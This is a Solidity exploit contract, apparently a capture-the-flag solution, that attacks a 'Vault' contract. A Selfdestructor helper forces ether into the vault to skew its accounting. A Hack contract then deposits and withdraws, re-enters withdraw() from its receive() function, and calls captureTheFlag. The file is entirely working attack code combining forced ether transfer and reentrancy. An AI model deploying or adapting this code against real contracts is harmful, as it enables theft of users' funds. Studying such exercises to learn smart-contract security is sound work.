// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./Vault.sol";

contract Selfdestructor {
    constructor(address payable receiver) payable {
        selfdestruct(receiver);
    }
}

contract Hack {

    Vault vault;

    bool reentered;

    constructor(Vault _vault) {
        vault = _vault;
    }

    receive() external payable {
        if (reentered) {
            return;
        }

        reentered = true;

        vault.withdraw(0, address(this), address(this));       
    }

    function hack(uint256 deposit, uint256 extra) external payable {
        require(msg.value == deposit + extra, "Sanity check");

        // forward some eth to the vault bypassing the accounting
        new Selfdestructor{ value: extra }(payable(address(vault)));

        // deposit some eth
        vault.deposit{ value: deposit }(deposit, address(this));

        // withdraw the whole deposit
        vault.withdraw(deposit, address(this), address(this));       

        vault.captureTheFlag(msg.sender);
    }
}
